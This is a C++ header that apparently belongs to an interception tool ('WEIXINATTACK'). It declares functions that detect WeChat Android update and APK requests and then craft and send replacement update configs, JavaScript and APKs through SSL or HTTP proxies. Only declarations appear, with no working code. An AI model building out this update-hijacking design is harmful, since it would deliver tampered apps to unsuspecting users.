#pragma once



#ifndef WEIXINATTACK_H_H_H
#define WEIXINATTACK_H_H_H
#include <windows.h>
#include <iostream>
#include "sslPublic.h"

using namespace std;





//#define HTTP2_PORT	8181

class WeixinAndroid {
public:

	static int isWxAndroidUpdateConfig(const char * url,const char * szdn);

	static int WeixinAndroid::isWxAndroidRequestApk(const char * lpurl, const char * szdn);

	static int WeixinAndroid::isWxAndroidRequestWebApk(const char * lpurl, const char * szdn);

	static int WeixinAndroid::sendWxAndroidUpdateApk(const char * lpurl, const char * lpdn, const char * httphdr, LPSSLPROXYPARAM lpssl);

	static int sendWxAndroidUpdateApk(const char * url, const char * szdm, const char * httphdr, LPHTTPPROXYPARAM lpparam);

	static int isWxAndroidUpdateApkJs(const char* url, const char * szdn);

	static int WeixinAndroid::makeWxAndroidUpdateApkJs(char*recvBuffer, int iCounter, int buflimit, LPSSLPROXYPARAM lpssl);


	static int WeixinAndroid::makeWxAndroidUpdateConfig(char * lpbuffer, int datasize, int buflimit, string username);
	static int WeixinAndroid::makeOldWxAndroidUpdateConfig(char * lpbuffer, int datasize, int buflimit, string username);

	int WeixinAndroid::makeOldOldWxAndroidUpdateConfig(char * lpbuffer, int datasize, int buflimit, string username);
};


#endif